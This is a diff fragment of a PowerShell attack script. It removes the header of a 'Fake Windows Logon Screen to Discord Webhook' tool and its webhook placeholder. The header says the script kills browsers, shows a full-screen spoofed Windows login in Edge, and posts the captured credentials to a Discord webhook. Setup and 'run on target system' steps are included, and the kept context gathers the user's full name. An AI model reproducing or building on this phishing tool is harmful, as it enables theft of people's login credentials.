@@ -1,22 +1,3 @@
-<#
-====================== Fake Windows Logon Screen to Discord Webhook =========================
-
-SYNOPNIS
-This script kills all egde and chrome processes, starts screensaver and opens edge in fullscreen that asks for login info and posts results to a discord webhook.
-
-SETUP
-1. Replace YOUR_WEBBHOOK_HERE with your webhook.
-
-USAGE
-1.Run script on target system.
-
-CREDIT
-The original idea for this cam from - https://github.com/Zarcolio/flipperzero/blob/main/BadUSB/Ducky%20Scripts/Awareness/Phish_Office365_From_Usb.txt
-The HTML for this script has been modified but was originally from - https://github.com/JoniRinta-Kahila/microsoft-login-spoof
-Kudos for creating this great look-a-like! 
-#>
-
-$dc = 'DISCORD_WEBHOOK_HERE'
 
 # GATHER SYSTEM AND USER INFO
 $u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
